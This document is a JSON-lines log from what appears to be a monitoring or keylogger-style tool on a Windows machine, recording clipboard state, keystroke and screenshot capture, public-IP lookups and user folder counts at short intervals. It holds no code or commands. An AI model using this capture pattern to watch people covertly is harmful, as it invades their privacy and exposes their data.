{"timestamp": "2025-06-14T07:47:50.922768+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8660254f3d9744f2a80106ee0ccdbc4623e2a434726ec506ac58eeea552f797c", "_raw_log_hash": "f6456d60fa4b8eff3d217d9a201d1491a6d059c631a0204c110915dcc174d77e"}
{"timestamp": "2025-06-14T07:48:04.420640+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ce0ffbeedec1586c9b4c4ad1768b3e602483b127aba3f23ca19b76e385ef8b1f", "_raw_log_hash": "4e9d48b23b37f82fcb7b2a50caf7771a86065fb20305e0cb4b9883a2b6a0f9c5"}
{"timestamp": "2025-06-14T07:48:17.916301+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a9475f727c6f7fd3b34b67477593bd4bb9fb54dec9021f6f57946bfa3fd9e76a", "_raw_log_hash": "1594b81135c2cbc8c6023282379f3435118a471f6d3c61bed866edf7597afaa9"}
{"timestamp": "2025-06-14T07:48:31.432091+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "338f4233d86d8023318b4bb4013a3b065dac209b893a657f3e27264a72ff2491", "_raw_log_hash": "e8cc2928380440869317a5c100c27bd4cdeb52cd63c364d766a774d14229dbf7"}
{"timestamp": "2025-06-14T07:48:44.947188+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e7f7719eebb88cdcd2ec8c47bbeb0d46f7da9294c80d46faa2c37d45986afc6e", "_raw_log_hash": "f4e14333911642088151352ac0ef883075e74c5af98188910b2c97d5d68c210a"}
{"timestamp": "2025-06-14T07:48:58.739559+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d6c01e98f16102e700453a9b5c1c376b0fb3c3613e4e508921fc00556c9c5ba3", "_raw_log_hash": "6c3290f10bc83d32f6eb8c5469599665d442888f9fa76c756f601fa2212ae56b"}
{"timestamp": "2025-06-14T07:49:12.307993+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3e21a0d392f32e80a4623c143a98fc7f6c6e474830335975abca37a3d7717bba", "_raw_log_hash": "882115c437e65e74b3bc86132b60c16195583bfc991c72895ff79dadf3bf5a6c"}
{"timestamp": "2025-06-14T07:49:25.836559+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7f0b03061872937e0f615430bec47354d55dc13c666bd33c74bdbb90c650a68c", "_raw_log_hash": "e6e37036d1e64832d7cf335cae7df8a2d276acf28a104d4bf50e8d598cf71fb7"}
{"timestamp": "2025-06-14T07:49:39.426340+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "38e37841cd81a427c6e92ce0059de25fceaa2e3a0b7b6e77b76baccb33431c54", "_raw_log_hash": "30efcebe084af53ea32507b0c4ea5f9789c1cb1d3c46557ec006a692035ba73e"}
{"timestamp": "2025-06-14T07:49:52.942534+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3aa6c63685b73fd650feaff53169a08e456be7eee35c065fed87aaa8cd168461", "_raw_log_hash": "2b58990acaf043269300e145b566e776f6aa27a2a3c9071ff97ce20ca2f699f7"}
{"timestamp": "2025-06-14T07:50:06.492189+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f0765fa59ef0b4b1bd1873ab10676feb113eff81481d1b3d78b4e1e6ab0b5f6e", "_raw_log_hash": "367443832524ae04396a4509897bf99735d882ec591f53a57086c93a49b265c8"}
{"timestamp": "2025-06-14T07:50:20.063361+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f391025f312202831ec89d2c1c7a098612e4e3a1b1705cfc1081a872ee107999", "_raw_log_hash": "8fc184593be3f3c8ca42b5e956fce57c0e1af6e220de22517ce31a8c68e4b1c8"}
{"timestamp": "2025-06-14T07:50:33.591407+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "99ebb8e228117072f30258a95e593e216ba88a94e1bb665d377ed2c1aaac36ee", "_raw_log_hash": "517a39eaf7ff6b4fbc9a3d5be900152647f2842e341578676f4396bb7ced1ed7"}
{"timestamp": "2025-06-14T07:50:47.092017+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "268abf88526a8c33a4633cce738bbc16ddb8acaea28d730c5687ba3b959c1889", "_raw_log_hash": "7f621d6421e47d39f71d355180898a03ba2b86119c8dc4e0f534b89903ad7a16"}
{"timestamp": "2025-06-14T07:51:00.668570+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c334f091580eddeea01d79e3b94a51190951630cc91ff2c7987b614b05e4e2df", "_raw_log_hash": "736c9cad75eb79a16bdf19c700715dff797e9f156991263214eefdbfca63b5ae"}
{"timestamp": "2025-06-14T07:51:14.181684+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "df21f17576042f4cd191a49b96f7d61d2d426260b70c9c8c8416b62256d92c48", "_raw_log_hash": "20b51fae0ff3670f7bec939b433036064f3b3ece93c908af5e8eff4ef9ee99e2"}
{"timestamp": "2025-06-14T07:51:27.727006+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8508d84e37f713299d900a7d0a601cace06b95003dc8a76dfecb24227ed2f6d5", "_raw_log_hash": "05f78682343af4c37dca01cc4c4bfdb71ebbd18fbedc02d8856859977d6477fb"}
{"timestamp": "2025-06-14T07:51:41.292768+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1da032ff10106f13746fcd0a7430dc6c302eab10924dbb2904b3733b0b1f86ae", "_raw_log_hash": "f92386539cb2e20249bd8216412841e8b024ebb846b6cb342e42b35adbc40cb3"}
{"timestamp": "2025-06-14T07:51:54.821433+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e12890e1f7db72cec32804e6423f4d7b1cbba3bc4c6a74c7e0aa7912264151bc", "_raw_log_hash": "e832839d7fb046eec18694050440294d68b333fb46d91586e0609aa91bacfebd"}
{"timestamp": "2025-06-14T07:52:08.401540+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5e3905ced35a49840c0e5937547cdfb52521b8e9fbcc231bd4db8cf8a791802c", "_raw_log_hash": "c7502ddea69d944d18a20125238c00a35dcaee6aa61a986afdde95c1da9fc487"}
{"timestamp": "2025-06-14T07:52:21.978302+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0f5950b86c00833e318e0f3b3b6c58c44f5d850600e504694957d7fa36614be9", "_raw_log_hash": "b618d127f562d2d546619b249ff377b95601f2c772227bdc0a21f479d1436c46"}
{"timestamp": "2025-06-14T07:52:35.482317+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3d974628f1e0448b3c5cb9e1dd60c376b9d4ded7a37edab520c15aaacf2dded0", "_raw_log_hash": "1d933fcc265da8b4bcc7d265d73cb999f1dc68e95ee3ae46511cc7f40e117dee"}
{"timestamp": "2025-06-14T07:52:49.020122+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8870a5caf885ab3dd9d2bd767e6b7f3e54096b70ffbd188ef564f3b8597e7664", "_raw_log_hash": "c4385b071c9050254a3e6d26a397d78915a735df00b63f341c4c3cf7a223354f"}
{"timestamp": "2025-06-14T07:53:02.825709+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b92234c6a8d0a47d61aa848d31cd4419fa442a631c614ef4471d86e6746a6bcd", "_raw_log_hash": "8341fb319fc1448f60d19dca3dd21e30fa917f7212608d876e22a9cb5973137e"}
{"timestamp": "2025-06-14T07:53:16.508724+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "88697dc90a3a0efe209700eada2c7e3e94d687d615537719da797484c9ebffa7", "_raw_log_hash": "afd8dd5a66d67b75e63bad42ef705d7c0f3863da3251bf7c6e12a3dad99b2c85"}
{"timestamp": "2025-06-14T07:53:30.080498+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9b0b21b930eb4c135d36b6f5d41e68ff7d91656342cf5292f63d501e5652113b", "_raw_log_hash": "e6aa6cd3ea606ee52b5e8ccdb3fc3253071f237483fded7e5ce239a96c978aeb"}
